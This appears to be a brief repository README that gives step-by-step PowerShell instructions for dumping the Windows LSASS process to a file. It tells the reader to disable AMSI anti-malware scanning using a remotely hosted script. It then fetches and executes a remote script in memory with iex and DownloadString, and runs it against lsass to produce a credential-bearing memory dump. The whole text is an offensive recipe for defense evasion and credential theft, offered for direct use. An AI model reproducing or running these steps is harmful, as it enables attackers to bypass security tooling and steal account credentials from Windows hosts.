# minidump
1. Open Powershell as Admin

2. Disable AMSI (paste the following): https://raw.githubusercontent.com/jj4152/invoke-mimikatz/main/disable-amsi

3. Load Out-Minidump into Memory: iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jj4152/minidump/main/Out-Minidump.ps1')

4. Execute "Get-Process lsass | Out-Minidump" 

Note: .dmp-file will be generated in directory you are currently in (in powershell)
